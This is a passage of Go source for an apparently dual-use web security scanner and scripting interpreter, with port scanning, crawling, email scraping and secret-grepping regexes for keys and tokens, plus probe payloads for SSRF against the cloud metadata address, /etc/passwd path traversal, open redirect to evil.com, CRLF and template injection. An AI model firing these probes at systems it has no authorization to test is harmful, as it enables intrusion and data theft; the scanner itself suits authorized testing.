	}
	return info
}

func probeHosts(hosts []string) []HostInfo {
	results := []HostInfo{}
	var mu sync.Mutex
	var wg sync.WaitGroup
	vroxInfo("[probe] Probing " + strconv.Itoa(len(hosts)) + " hosts...")
	for _, host := range hosts {
		wg.Add(1)
		go func(h string) {
			defer wg.Done()
			h = strings.Replace(strings.Replace(strings.Split(h, " ")[0], "https://", "", 1), "http://", "", 1)
			info := probeHost(h)
			if info.StatusCode > 0 {
				mu.Lock()
				results = append(results, info)
				color := COLORS["GREEN"]
				if info.StatusCode >= 400 { color = COLORS["YELLOW"] }
				if info.StatusCode >= 500 { color = COLORS["RED"] }
				fmt.Println(color + "[probe] " + h + " -> " + strconv.Itoa(info.StatusCode) + " | " + info.Title + " | " + strconv.FormatInt(info.ResponseMs, 10) + "ms | " + info.Server + COLORS["RESET"])
				mu.Unlock()
			} else {
				fmt.Println(COLORS["RED"] + "[probe] " + h + " -> dead" + COLORS["RESET"])
			}
		}(host)
	}
	wg.Wait()
	return results
}

func checkAlive(hosts []string) []string {
	results := probeHosts(hosts)
	alive := []string{}
	for _, r := range results { alive = append(alive, r.Host+" -> "+strconv.Itoa(r.StatusCode)) }
	return alive
}

// ============================================================
// ALL OTHER SECURITY FUNCTIONS (kept from 2.2)
// ============================================================
func scanPorts(host string, customPorts []int) []string {
	ports := []int{21,22,23,25,53,80,443,445,3306,3389,8080,8443,8888,9200,6379,27017,5432,1433,9300,4443}
	if len(customPorts) > 0 { ports = customPorts }
	portNames := map[int]string{21:"FTP",22:"SSH",23:"Telnet",25:"SMTP",53:"DNS",80:"HTTP",443:"HTTPS",445:"SMB",3306:"MySQL",3389:"RDP",8080:"HTTP-Alt",8443:"HTTPS-Alt",9200:"Elasticsearch",6379:"Redis",27017:"MongoDB",5432:"PostgreSQL",1433:"MSSQL"}
	open := []string{}
	var mu sync.Mutex
	var wg sync.WaitGroup
	for _, port := range ports {
		wg.Add(1)
		go func(p int) {
			defer wg.Done()
			conn, err := net.DialTimeout("tcp", host+":"+strconv.Itoa(p), 1*time.Second)
			if err == nil {
				conn.Close()
				name := portNames[p]; if name == "" { name = "Unknown" }
				result := strconv.Itoa(p) + "/" + name
				mu.Lock(); open = append(open, result)
				color := COLORS["GREEN"]
				if p == 22 || p == 3389 || p == 3306 || p == 27017 { color = COLORS["RED"] }
				fmt.Println(color + "[ports] " + host + ":" + result + " -> open" + COLORS["RESET"])
				mu.Unlock()
			}
		}(port)
	}
	wg.Wait()
	return open
}

func grabHeaders(targetURL string) map[string]string {
	headers := map[string]string{}
	req, _ := http.NewRequest("GET", targetURL, nil)
	for k, v := range globalHeaders { req.Header.Set(k, v) }
	for k, v := range globalCookies { req.AddCookie(&http.Cookie{Name: k, Value: v}) }
	resp, err := httpClientFollow.Do(req)
	if err != nil { fmt.Println(COLORS["RED"] + "[headers] Failed" + COLORS["RESET"]); return headers }
	defer resp.Body.Close()
	for _, c := range resp.Cookies() { globalCookies[c.Name] = c.Value }
	for k, v := range resp.Header {
		headers[k] = strings.Join(v, ", ")
		fmt.Println(COLORS["CYAN"] + "[header] " + k + ": " + strings.Join(v, ", ") + COLORS["RESET"])
	}
	return headers
}

func checkSecHeaders(targetURL string) ([]string, []string) {
	important := map[string]string{"Strict-Transport-Security":"HSTS","X-Frame-Options":"Clickjacking Protection","X-Content-Type-Options":"MIME Sniffing Protection","Content-Security-Policy":"CSP","X-XSS-Protection":"XSS Protection","Referrer-Policy":"Referrer Policy","Permissions-Policy":"Permissions Policy"}
	headers := grabHeaders(targetURL)
	missing, present := []string{}, []string{}
	for header, name := range important {
		found := false
		for k := range headers { if strings.EqualFold(k, header) { found = true; break } }
		if found { present = append(present, name); fmt.Println(COLORS["GREEN"] + "[secheaders] Present: " + name + COLORS["RESET"])
		} else { missing = append(missing, name); fmt.Println(COLORS["RED"] + "[secheaders] Missing: " + name + COLORS["RESET"]) }
	}
	return missing, present
}

func dnsLookup(domain string) map[string]string {
	records := map[string]string{}
	ips, err := net.LookupHost(domain)
	if err == nil { records["A"] = strings.Join(ips, ", "); fmt.Println(COLORS["GREEN"] + "[dns] A: " + strings.Join(ips, ", ") + COLORS["RESET"]) }
	cname, err := net.LookupCNAME(domain)
	if err == nil && cname != domain+"." { records["CNAME"] = cname; fmt.Println(COLORS["CYAN"] + "[dns] CNAME: " + cname + COLORS["RESET"]) }
	mxs, err := net.LookupMX(domain)
	if err == nil { for _, mx := range mxs { fmt.Println(COLORS["CYAN"] + "[dns] MX: " + mx.Host + COLORS["RESET"]) } }
	txts, err := net.LookupTXT(domain)
	if err == nil { for _, txt := range txts { fmt.Println(COLORS["CYAN"] + "[dns] TXT: " + txt + COLORS["RESET"]); records["TXT"] = txt } }
	nss, err := net.LookupNS(domain)
	if err == nil { for _, ns := range nss { fmt.Println(COLORS["CYAN"] + "[dns] NS: " + ns.Host + COLORS["RESET"]) } }
	return records
}

func fetchPage(targetURL string) (int, string, map[string]string) {
	req, err := http.NewRequest("GET", targetURL, nil)
	if err != nil { return 0, "", map[string]string{} }
	req.Header.Set("User-Agent", "VroxScript/"+VERSION)
	for k, v := range globalHeaders { req.Header.Set(k, v) }
	for k, v := range globalCookies { req.AddCookie(&http.Cookie{Name: k, Value: v}) }
	start := time.Now()
	resp, err := httpClientFollow.Do(req)
	elapsed := time.Since(start).Milliseconds()
	if err != nil { fmt.Println(COLORS["RED"] + "[fetch] Failed: " + targetURL + COLORS["RESET"]); return 0, "", map[string]string{} }
	defer resp.Body.Close()
	for _, c := range resp.Cookies() { globalCookies[c.Name] = c.Value }
	buf := make([]byte, 10000); n, _ := resp.Body.Read(buf)
	headers := map[string]string{}
	for k, v := range resp.Header { headers[k] = strings.Join(v, ", ") }
	fmt.Println(COLORS["GREEN"] + "[fetch] " + targetURL + " -> " + strconv.Itoa(resp.StatusCode) + " (" + strconv.FormatInt(elapsed, 10) + "ms)" + COLORS["RESET"])
	return resp.StatusCode, string(buf[:n]), headers
}

func crawlLinks(targetURL string) []string {
	_, body, _ := fetchPage(targetURL)
	links := []string{}; seen := map[string]bool{}
	re := regexp.MustCompile(`href="(https?://[^"]+)"`)
	for _, m := range re.FindAllStringSubmatch(body, -1) {
		if !seen[m[1]] { seen[m[1]] = true; links = append(links, m[1]); fmt.Println(COLORS["CYAN"] + "[crawl] " + m[1] + COLORS["RESET"]) }
	}
	return links
}

func extractJSUrls(targetURL string) []string {
	_, body, _ := fetchPage(targetURL)
	results := []string{}; seen := map[string]bool{}
	re1 := regexp.MustCompile(`["'](/[a-zA-Z0-9/_\-.]+)["']`)
	re2 := regexp.MustCompile(`src=["']([^"']+\.js)["']`)
	for _, m := range re1.FindAllStringSubmatch(body, -1) {
		if !seen[m[1]] { seen[m[1]] = true; results = append(results, m[1]); fmt.Println(COLORS["CYAN"] + "[js] " + m[1] + COLORS["RESET"]) }
	}
	for _, m := range re2.FindAllStringSubmatch(body, -1) {
		if !seen[m[1]] { seen[m[1]] = true; results = append(results, m[1]); fmt.Println(COLORS["CYAN"] + "[js] " + m[1] + COLORS["RESET"]) }
	}
	return results
}

func extractParams(rawURL string) []string {
	parsed, err := url.Parse(rawURL)
	if err != nil { return []string{} }
	results := []string{}
	for k, v := range parsed.Query() {
		result := k + "=" + strings.Join(v, ",")
		results = append(results, result)
		fmt.Println(COLORS["CYAN"] + "[params] " + result + COLORS["RESET"])
	}
	return results
}

func waybackLookup(domain string) []string {
	resp, err := httpClientFollow.Get("http://web.archive.org/cdx/search/cdx?url=" + domain + "/*&output=json&limit=30&fl=original")
	if err != nil { return []string{} }
	defer resp.Body.Close()
	var data [][]string
	json.NewDecoder(resp.Body).Decode(&data)
	results := []string{}
	if len(data) > 1 {
		for _, item := range data[1:] { results = append(results, item[0]); fmt.Println(COLORS["CYAN"] + "[wayback] " + item[0] + COLORS["RESET"]) }
	}
	return results
}

func grepSecrets(content string) map[string][]string {
	patterns := map[string]string{
		"API Key":"(?i)api[_-]?key[\"'\\s:=]+([a-zA-Z0-9_\\-]{20,})",
		"Secret":"(?i)secret[\"'\\s:=]+([a-zA-Z0-9_\\-]{20,})",
		"Token":"(?i)token[\"'\\s:=]+([a-zA-Z0-9_\\-]{20,})",
		"Password":"(?i)password[\"'\\s:=]+([a-zA-Z0-9_\\-]{8,})",
		"AWS Key":"AKIA[0-9A-Z]{16}",
		"Private Key":"-----BEGIN (RSA |EC )?PRIVATE KEY-----",
		"Email":"[a-zA-Z0-9._%+\\-]+@[a-zA-Z0-9.\\-]+\\.[a-zA-Z]{2,}",
		"JWT":"eyJ[a-zA-Z0-9_\\-]+\\.[a-zA-Z0-9_\\-]+\\.[a-zA-Z0-9_\\-]+",
		"Google API":"AIza[0-9A-Za-z\\-_]{35}",
		"GitHub Token":"ghp_[a-zA-Z0-9]{36}",
	}
	found := map[string][]string{}
	for name, pattern := range patterns {
		re := regexp.MustCompile(pattern)
		matches := re.FindAllString(content, -1)
		if len(matches) > 0 { found[name] = matches; fmt.Println(COLORS["RED"] + "[secrets] Found " + name + ": " + strings.Join(matches, ", ") + COLORS["RESET"]) }
	}
	return found
}

func checkSubdomainTakeover(domain string, subdomains []string) []string {
	cnames := map[string]string{"amazonaws.com":"AWS S3","github.io":"GitHub Pages","herokuapp.com":"Heroku","azurewebsites.net":"Azure","netlify.app":"Netlify","vercel.app":"Vercel","surge.sh":"Surge"}
	vulnerable := []string{}
	for _, sub := range subdomains {
		cname, err := net.LookupCNAME(sub)
		if err == nil {
			for pattern, service := range cnames {
				if strings.Contains(cname, pattern) {
					resp, err := httpClientFollow.Get("https://" + sub)
					if err != nil || resp.StatusCode == 404 {
						result := sub + " -> VULNERABLE (" + service + ")"
						vulnerable = append(vulnerable, result)
						fmt.Println(COLORS["RED"] + "[takeover] " + result + COLORS["RESET"])
					}
				}
			}
		}
	}
	if len(vulnerable) == 0 { vroxSuccess("[takeover] No subdomain takeover found") }
	return vulnerable
}

func checkCORS(targetURL string) map[string]string {
	results := map[string]string{}
	for _, origin := range []string{"https://evil.com", "null"} {
		req, err := http.NewRequest("GET", targetURL, nil)
		if err != nil { continue }
		req.Header.Set("Origin", origin)
		resp, err := httpClientFollow.Do(req)
		if err != nil { continue }
		defer resp.Body.Close()
		acao := resp.Header.Get("Access-Control-Allow-Origin")
		acac := resp.Header.Get("Access-Control-Allow-Credentials")
		if acao == "*" { fmt.Println(COLORS["RED"] + "[cors] VULNERABLE: Wildcard" + COLORS["RESET"]); results["wildcard"] = "*"
		} else if acao == origin {
			fmt.Println(COLORS["RED"] + "[cors] VULNERABLE: Reflected " + origin + COLORS["RESET"]); results[origin] = "Reflected"
			if acac == "true" { fmt.Println(COLORS["RED"] + "[cors] CRITICAL: Credentials!" + COLORS["RESET"]); results["credentials"] = "true" }
		} else { fmt.Println(COLORS["GREEN"] + "[cors] " + origin + " -> safe" + COLORS["RESET"]) }
	}
	if len(results) == 0 { vroxSuccess("[cors] No CORS issues") }
	return results
}

func checkSSL(targetURL string) map[string]string {
	results := map[string]string{}
	host := strings.Replace(strings.Replace(targetURL, "https://", "", 1), "http://", "", 1)
	host = strings.Split(host, "/")[0]
	conn, err := tls.Dial("tcp", host+":443", &tls.Config{InsecureSkipVerify: false})
	if err != nil { results["error"] = err.Error(); fmt.Println(COLORS["RED"] + "[ssl] Error: " + err.Error() + COLORS["RESET"]); return results }
	defer conn.Close()
	cert := conn.ConnectionState().PeerCertificates[0]
	daysLeft := int(time.Until(cert.NotAfter).Hours() / 24)
	results["subject"] = cert.Subject.CommonName; results["issuer"] = cert.Issuer.CommonName
	results["expires"] = cert.NotAfter.Format("2006-01-02"); results["days_left"] = strconv.Itoa(daysLeft)
	fmt.Println(COLORS["CYAN"] + "[ssl] Subject: " + cert.Subject.CommonName + COLORS["RESET"])
	fmt.Println(COLORS["CYAN"] + "[ssl] Expires: " + cert.NotAfter.Format("2006-01-02") + COLORS["RESET"])
	if daysLeft < 30 { fmt.Println(COLORS["RED"] + "[ssl] WARNING: Expires in " + strconv.Itoa(daysLeft) + " days!" + COLORS["RESET"])
	} else { fmt.Println(COLORS["GREEN"] + "[ssl] Valid for " + strconv.Itoa(daysLeft) + " days" + COLORS["RESET"]) }
	return results
}

func detectTech(targetURL string) []string {
	_, body, headers := fetchPage(targetURL)
	patterns := map[string]string{"WordPress":"wp-content","jQuery":"jquery","React":"react","Angular":"angular","Vue.js":"vue","Bootstrap":"bootstrap","Laravel":"laravel","Django":"django","ASP.NET":"aspnet","PHP":"\\.php","Nginx":"nginx","Apache":"apache","Cloudflare":"cloudflare","Next.js":"__NEXT_DATA__"}
	technologies := []string{}; seen := map[string]bool{}
	for tech, pattern := range patterns {
		re := regexp.MustCompile(`(?i)` + pattern)
		if re.MatchString(body) && !seen[tech] { seen[tech] = true; technologies = append(technologies, tech); fmt.Println(COLORS["GREEN"] + "[techdetect] Found: " + tech + COLORS["RESET"]); continue }
		for _, v := range headers {
			if re.MatchString(v) && !seen[tech] { seen[tech] = true; technologies = append(technologies, tech); fmt.Println(COLORS["GREEN"] + "[techdetect] Found: " + tech + COLORS["RESET"]); break }
		}
	}
	return technologies
}

func extractEmails(targetURL string) []string {
	_, body, _ := fetchPage(targetURL)
	re := regexp.MustCompile(`[a-zA-Z0-9._%+\-]+@[a-zA-Z0-9.\-]+\.[a-zA-Z]{2,}`)
	seen := map[string]bool{}; results := []string{}
	for _, m := range re.FindAllString(body, -1) {
		if !seen[m] { seen[m] = true; results = append(results, m); fmt.Println(COLORS["CYAN"] + "[emails] " + m + COLORS["RESET"]) }
	}
	return results
}

func checkRateLimit(targetURL string) map[string]string {
	results := map[string]string{}
	codes := map[int]int{}
	for i := 0; i < 20; i++ {
		resp, err := httpClientFollow.Get(targetURL)
		if err == nil { codes[resp.StatusCode]++; resp.Body.Close() }
		time.Sleep(100 * time.Millisecond)
	}
	if codes[429] > 0 { vroxSuccess("[ratelimit] Protected"); results["status"] = "protected"
	} else if codes[200] == 20 { fmt.Println(COLORS["RED"] + "[ratelimit] No rate limiting!" + COLORS["RESET"]); results["status"] = "vulnerable"
	} else { vroxWarn("[ratelimit] Inconclusive"); results["status"] = "inconclusive" }
	return results
}

func checkOpenRedirect(targetURL string) []string {
	payloads := []string{"//evil.com","https://evil.com","/\\evil.com"}
	params := []string{"url","redirect","next","return","goto","dest","redir","redirect_uri","return_url"}
	vulnerable := []string{}
	parsed, err := url.Parse(targetURL)
	if err != nil { return vulnerable }
	for _, param := range params {
		for _, payload := range payloads {
			testURL := parsed.Scheme + "://" + parsed.Host + parsed.Path + "?" + param + "=" + url.QueryEscape(payload)
			resp, err := httpClient.Get(testURL)
			if err == nil {
				defer resp.Body.Close()
				if resp.StatusCode == 301 || resp.StatusCode == 302 {
					if strings.Contains(resp.Header.Get("Location"), "evil.com") {
						result := param + "=" + payload + " -> VULNERABLE"
						vulnerable = append(vulnerable, result)
						fmt.Println(COLORS["RED"] + "[openredirect] " + result + COLORS["RESET"])
					}
				}
			}
		}
	}
	if len(vulnerable) == 0 { vroxSuccess("[openredirect] No open redirect") }
	return vulnerable
}

func checkSSRF(targetURL string, param string) []string {
	payloads := []string{"http://169.254.169.254/latest/meta-data/","http://localhost/","http://127.0.0.1/"}
	vulnerable := []string{}
	parsed, err := url.Parse(targetURL)
	if err != nil { return vulnerable }
	for _, payload := range payloads {
		testURL := parsed.Scheme + "://" + parsed.Host + parsed.Path + "?" + param + "=" + url.QueryEscape(payload)
		resp, err := httpClientFollow.Get(testURL)
		if err == nil {
			defer resp.Body.Close()
			buf := make([]byte, 1000); n, _ := resp.Body.Read(buf)
			if strings.Contains(string(buf[:n]), "ami-id") || strings.Contains(string(buf[:n]), "instance-id") {
				result := param + "=" + payload + " -> VULNERABLE"
				vulnerable = append(vulnerable, result)
				fmt.Println(COLORS["RED"] + "[ssrf] VULNERABLE: " + result + COLORS["RESET"])
			}
		}
	}
	if len(vulnerable) == 0 { vroxSuccess("[ssrf] No SSRF found") }
	return vulnerable
}

func checkLFI(targetURL string, param string) []string {
	payloads := []string{"../etc/passwd","../../etc/passwd","../../../etc/passwd","/etc/passwd"}
	vulnerable := []string{}
	parsed, err := url.Parse(targetURL)
	if err != nil { return vulnerable }
	for _, payload := range payloads {
		testURL := parsed.Scheme + "://" + parsed.Host + parsed.Path + "?" + param + "=" + payload
		resp, err := httpClientFollow.Get(testURL)
		if err == nil {
			defer resp.Body.Close()
			buf := make([]byte, 2000); n, _ := resp.Body.Read(buf)
			if strings.Contains(string(buf[:n]), "root:") {
				result := param + "=" + payload + " -> VULNERABLE"
				vulnerable = append(vulnerable, result)
				fmt.Println(COLORS["RED"] + "[lfi] VULNERABLE: " + result + COLORS["RESET"])
			}
		}
	}
	if len(vulnerable) == 0 { vroxSuccess("[lfi] No LFI found") }
	return vulnerable
}

func checkCRLF(targetURL string) []string {
	payloads := []string{"%0d%0aHeader:injected","%0aHeader:injected"}
	vulnerable := []string{}
	for _, payload := range payloads {
		resp, err := httpClient.Get(targetURL + "?" + payload)
		if err == nil {
			defer resp.Body.Close()
			for k := range resp.Header {
				if strings.ToLower(k) == "header" {
					result := payload + " -> VULNERABLE"
					vulnerable = append(vulnerable, result)
					fmt.Println(COLORS["RED"] + "[crlf] VULNERABLE: " + result + COLORS["RESET"])
					break
				}
			}
		}
	}
	if len(vulnerable) == 0 { vroxSuccess("[crlf] No CRLF found") }
	return vulnerable
}

func checkSSTI(targetURL string, param string) []string {
	payloads := []string{"{{7*7}}","${7*7}","<%= 7*7 %>"}
	vulnerable := []string{}
	parsed, err := url.Parse(targetURL)
	if err != nil { return vulnerable }
	for _, payload := range payloads {
		testURL := parsed.Scheme + "://" + parsed.Host + parsed.Path + "?" + param + "=" + url.QueryEscape(payload)
		resp, err := httpClientFollow.Get(testURL)
		if err == nil {
			defer resp.Body.Close()
			buf := make([]byte, 2000); n, _ := resp.Body.Read(buf)
			if strings.Contains(string(buf[:n]), "49") {
				result := param + "=" + payload + " -> VULNERABLE"
				vulnerable = append(vulnerable, result)
				fmt.Println(COLORS["RED"] + "[ssti] VULNERABLE: " + result + COLORS["RESET"])
			}
		}
	}
	if len(vulnerable) == 0 { vroxSuccess("[ssti] No SSTI found") }
	return vulnerable
}

func measureResponseTime(targetURL string, count int) map[string]string {
	results := map[string]string{}
	var total int64; var min int64 = 99999; var max int64 = 0
	for i := 0; i < count; i++ {
		start := time.Now()
		resp, err := httpClientFollow.Get(targetURL)
		elapsed := time.Since(start).Milliseconds()
		if err == nil { resp.Body.Close(); total += elapsed; if elapsed < min { min = elapsed }; if elapsed > max { max = elapsed } }
	}
	avg := total / int64(count)
	results["min"] = strconv.FormatInt(min, 10) + "ms"; results["max"] = strconv.FormatInt(max, 10) + "ms"; results["avg"] = strconv.FormatInt(avg, 10) + "ms"
	fmt.Println(COLORS["CYAN"] + "[timing] Min: " + results["min"] + " Max: " + results["max"] + " Avg: " + results["avg"] + COLORS["RESET"])
	return results
}

func regexSearch(pattern string, content string) []string {
	re, err := regexp.Compile(pattern)
	if err != nil { fmt.Println(COLORS["RED"] + "[regex] Invalid: " + err.Error() + COLORS["RESET"]); return []string{} }
	matches := re.FindAllString(content, -1)
	for _, m := range matches { fmt.Println(COLORS["CYAN"] + "[regex] " + m + COLORS["RESET"]) }
	return matches
}

// ============================================================
// TABLE OUTPUT (NEW 2.3)
// ============================================================
func printTable(headers []string, rows [][]string) {
	widths := make([]int, len(headers))
	for i, h := range headers { widths[i] = len(h) }
	for _, row := range rows {
		for i, cell := range row {
			if i < len(widths) && len(cell) > widths[i] { widths[i] = len(cell) }
		}
	}
	separator := "+"
	for _, w := range widths { separator += strings.Repeat("-", w+2) + "+" }
	fmt.Println(COLORS["CYAN"] + separator + COLORS["RESET"])
	headerRow := "|"
	for i, h := range headers { headerRow += " " + COLORS["BOLD"] + h + strings.Repeat(" ", widths[i]-len(h)) + COLORS["RESET"] + " |" }
	fmt.Println(headerRow)
	fmt.Println(COLORS["CYAN"] + separator + COLORS["RESET"])
	for _, row := range rows {
		dataRow := "|"
		for i, cell := range row {
			if i < len(widths) { dataRow += " " + cell + strings.Repeat(" ", widths[i]-len(cell)) + " |" }
		}
		fmt.Println(dataRow)
	}
	fmt.Println(COLORS["CYAN"] + separator + COLORS["RESET"])
}

// ============================================================
// PROGRESS BAR (NEW 2.3)
// ============================================================
func printProgress(current int, total int, label string) {
	percent := (current * 100) / total
	filled := percent / 5
	bar := "[" + strings.Repeat("█", filled) + strings.Repeat("░", 20-filled) + "]"
	fmt.Printf("\r%s%s %d%%%s %s", COLORS["GREEN"], bar, percent, COLORS["RESET"], label)
	if current >= total { fmt.Println() }
}

// ============================================================
// SPINNER (NEW 2.3)
// ============================================================
func spinner(msg string, duration int) {
	frames := []string{"⠋","⠙","⠹","⠸","⠼","⠴","⠦","⠧","⠇","⠏"}
	end := time.Now().Add(time.Duration(duration) * time.Millisecond)
	i := 0
	for time.Now().Before(end) {
		fmt.Printf("\r%s%s%s %s", COLORS["CYAN"], frames[i%len(frames)], COLORS["RESET"], msg)
		time.Sleep(100 * time.Millisecond)
		i++
	}
	fmt.Println()
}

// ============================================================
// GENERATE REPORT
// ============================================================
func generateReport(target string, variables map[string]interface{}) string {
	now := time.Now().Format("2006-01-02 15:04:05")
	lines := []string{"============================================================","VroxScript " + VERSION + " Security Report","Target: " + target,"Generated: " + now,"============================================================"}
	sections := []struct{ key, title string }{
		{"resolved_ip","IP"},{"scan_results","Subdomains"},{"alive_results","Alive Hosts"},
		{"port_results","Open Ports"},{"tech_results","Technologies"},{"fuzz_results","Fuzz Results"},
		{"wayback_results","Wayback URLs"},{"missing_headers","Missing Security Headers"},
		{"cors_results","CORS Issues"},{"takeover_results","Subdomain Takeover"},
		{"openredirect_results","Open Redirect"},{"sqli_results","SQL Injection"},
		{"xss_results","XSS"},{"ssrf_results","SSRF"},{"lfi_results","LFI"},
		{"crlf_results","CRLF"},{"ssti_results","SSTI"},{"ssl_results","SSL"},
		{"ratelimit_results","Rate Limit"},{"email_results","Emails"},{"secrets_found","Secrets"},
		{"cdn_result","CDN"},{"favicon_hash","Favicon Hash"},{"param_results","Parameters"},
	}
	for _, s := range sections {
		if v, ok := variables[s.key]; ok {
			switch val := v.(type) {
			case []string:
				if len(val) > 0 { lines = append(lines, "\n["+s.title+": "+strconv.Itoa(len(val))+"]"); for _, item := range val { lines = append(lines, "  "+item) } }
			case string:
				if val != "" { lines = append(lines, "\n["+s.title+"]\n  "+val) }
			case map[string]string:
				if len(val) > 0 { lines = append(lines, "\n["+s.title+"]"); for k, v2 := range val { lines = append(lines, "  "+k+": "+v2) } }
			}
		}
	}
	lines = append(lines, "\n============================================================","VroxScript "+VERSION,"github.com/InterviewCopilot350/vroxscript","============================================================")
	return strings.Join(lines, "\n")
}

func saveToFile(filename string, content string) {
	err := os.WriteFile(filename, []byte(content), 0644)
	if err != nil { fmt.Println(COLORS["RED"] + "[save] Failed: " + err.Error() + COLORS["RESET"])
	} else { vroxInfo("[save] Written to " + filename) }
}

func importFile(filename string, variables map[string]interface{}, debug bool) {
	data, err := os.ReadFile(filename)
	if err != nil { fmt.Println(COLORS["RED"] + "[import] Cannot open: " + filename + COLORS["RESET"]); return }
	vroxInfo("[import] Loading: " + filename)
	runCode(string(data), variables, debug)
}

// Template engine
type VroxTemplate struct { Name, Severity, Method, Path, Body, Extractor string; Headers map[string]string; Matchers []string }

func loadTemplate(filename string) (VroxTemplate, error) {
	data, err := os.ReadFile(filename)
	if err != nil { return VroxTemplate{}, err }
	tmpl := VroxTemplate{Headers: map[string]string{}}
	for _, line := range strings.Split(string(data), "\n") {
		line = strings.TrimSpace(line)
		if strings.HasPrefix(line, "name:") { tmpl.Name = strings.TrimSpace(line[5:]) }
		if strings.HasPrefix(line, "severity:") { tmpl.Severity = strings.TrimSpace(line[9:]) }
		if strings.HasPrefix(line, "method:") { tmpl.Method = strings.TrimSpace(line[7:]) }
		if strings.HasPrefix(line, "path:") { tmpl.Path = strings.TrimSpace(line[5:]) }
		if strings.HasPrefix(line, "body:") { tmpl.Body = strings.TrimSpace(line[5:]) }
		if strings.HasPrefix(line, "match:") { tmpl.Matchers = append(tmpl.Matchers, strings.TrimSpace(line[6:])) }
		if strings.HasPrefix(line, "extract:") { tmpl.Extractor = strings.TrimSpace(line[8:]) }
	}
	return tmpl, nil
}

func runTemplate(tmpl VroxTemplate, target string) (bool, string) {
	method := tmpl.Method; if method == "" { method = "GET" }
	path := tmpl.Path; if path == "" { path = "/" }
	fullURL := strings.TrimRight(target, "/") + path
	var req *http.Request
	if tmpl.Body != "" { req, _ = http.NewRequest(method, fullURL, strings.NewReader(tmpl.Body))
	} else { req, _ = http.NewRequest(method, fullURL, nil) }
	req.Header.Set("User-Agent", "VroxScript/"+VERSION)
	resp, err := httpClientFollow.Do(req)
	if err != nil { return false, "" }
	defer resp.Body.Close()
	buf := make([]byte, 50000); n, _ := resp.Body.Read(buf)
	body := string(buf[:n])
	for _, matcher := range tmpl.Matchers {
		if strings.HasPrefix(matcher, "status:") { code, _ := strconv.Atoi(strings.TrimSpace(matcher[7:])); if resp.StatusCode != code { return false, "" }
		} else if strings.HasPrefix(matcher, "regex:") { re, err := regexp.Compile(strings.TrimSpace(matcher[6:])); if err != nil || !re.MatchString(body) { return false, "" }
		} else { if !strings.Contains(body, matcher) { return false, "" } }
	}
	extracted := ""
	if tmpl.Extractor != "" { re, err := regexp.Compile(tmpl.Extractor); if err == nil { extracted = strings.Join(re.FindAllString(body, -1), ", ") } }
	return true, extracted
}

func runTemplatesDir(dir string, target string) []string {
	results := []string{}
	files, err := os.ReadDir(dir)
	if err != nil { vroxWarn("[templates] Cannot read: " + dir); return results }
	for _, file := range files {
		if !strings.HasSuffix(file.Name(), ".vstemplate") { continue }
		tmpl, err := loadTemplate(dir + "/" + file.Name())
		if err != nil { continue }
		matched, extracted := runTemplate(tmpl, target)
		if matched {
			color := COLORS["YELLOW"]
			if tmpl.Severity == "critical" { color = COLORS["RED"] + COLORS["BOLD"] }
			if tmpl.Severity == "high" { color = COLORS["RED"] }
			if tmpl.Severity == "info" { color = COLORS["GREEN"] }
			result := "[" + strings.ToUpper(tmpl.Severity) + "] " + tmpl.Name + " -> " + target
			if extracted != "" { result += " | " + extracted }
			results = append(results, result)
			fmt.Println(color + "[template] MATCH: " + result + COLORS["RESET"])
		}
	}
	return results
}

// ============================================================
// INTERPRETER
// ============================================================
func runCode(code string, variables map[string]interface{}, debug bool) {
	lines := strings.Split(code, "\n")
	i := 0
	for i < len(lines) {
		if breakSignal || continueSignal { break }
		line := strings.TrimSpace(lines[i])
		if line == "" || strings.HasPrefix(line, "#") || strings.HasPrefix(line, "//") { i++; continue }
		if debug { fmt.Println(COLORS["YELLOW"] + "[debug] Line " + strconv.Itoa(i+1) + ": " + line + COLORS["RESET"]) }
		saveTo := ""
		if strings.Contains(line, ">>") { parts := strings.SplitN(line, ">>", 2); line = strings.TrimSpace(parts[0]); saveTo = strings.TrimSpace(parts[1]) }
		switch {
		case strings.HasPrefix(line, "if "):
			condition := strings.TrimSuffix(strings.TrimPrefix(line, "if "), " {")
			block, elseBlock := []string{}, []string{}
			i++; inElse := false
			for i < len(lines) {
				l := strings.TrimSpace(lines[i])
				if l == "}" && !inElse { if i+1 < len(lines) && strings.HasPrefix(strings.TrimSpace(lines[i+1]), "else") { inElse = true; i += 2; continue }; break
				} else if l == "}" && inElse { break
				} else if inElse { elseBlock = append(elseBlock, lines[i])
				} else { block = append(block, lines[i]) }
				i++
			}
			if evalCondition(condition, variables) { runCode(strings.Join(block, "\n"), variables, debug)
			} else if len(elseBlock) > 0 { runCode(strings.Join(elseBlock, "\n"), variables, debug) }

		case strings.HasPrefix(line, "unless "):
			condition := strings.TrimSuffix(strings.TrimPrefix(line, "unless "), " {")
			block := []string{}; i++
			for i < len(lines) { if strings.TrimSpace(lines[i]) == "}" { break }; block = append(block, lines[i]); i++ }
			if !evalCondition(condition, variables) { runCode(strings.Join(block, "\n"), variables, debug) }

		case strings.HasPrefix(line, "switch "):
			switchVal := resolveValue(strings.TrimSuffix(strings.TrimPrefix(line, "switch "), " {"), variables)
			cases := map[string][]string{}
			defaultBlock := []string{}
			currentCase := ""
			i++
			for i < len(lines) {
				l := strings.TrimSpace(lines[i])
				if l == "}" { break }
				if strings.HasPrefix(l, "case ") {
					currentCase = strings.Trim(strings.TrimSuffix(strings.TrimPrefix(l, "case "), " {"), "\"")
					cases[currentCase] = []string{}
				} else if strings.HasPrefix(l, "default") {
					currentCase = "__default__"
					defaultBlock = []string{}
				} else if l == "}" {
					currentCase = ""
				} else if currentCase == "__default__" {
					defaultBlock = append(defaultBlock, lines[i])
				} else if currentCase != "" {
					cases[currentCase] = append(cases[currentCase], lines[i])
				}
				i++
			}
			if block, ok := cases[switchVal]; ok { runCode(strings.Join(block, "\n"), variables, debug)
			} else if len(defaultBlock) > 0 { runCode(strings.Join(defaultBlock, "\n"), variables, debug) }

		case strings.HasPrefix(line, "while "):
			condition := strings.TrimSuffix(strings.TrimPrefix(line, "while "), " {")
			block := []string{}; i++
			for i < len(lines) { if strings.TrimSpace(lines[i]) == "}" { break }; block = append(block, lines[i]); i++ }
			count := 0
			for evalCondition(condition, variables) && count < 10000 {
				continueSignal = false; runCode(strings.Join(block, "\n"), variables, debug)
				if breakSignal { breakSignal = false; break }; count++
			}

		case strings.HasPrefix(line, "loop "):
			parts := strings.Fields(strings.TrimSuffix(line, " {"))
			count, _ := strconv.Atoi(resolveValue(parts[1], variables))
			indexVar := "i"
			if len(parts) > 3 && parts[2] == "as" { indexVar = parts[3] }
			block := []string{}; i++
			for i < len(lines) { if strings.TrimSpace(lines[i]) == "}" { break }; block = append(block, lines[i]); i++ }
			for j := 0; j < count; j++ {
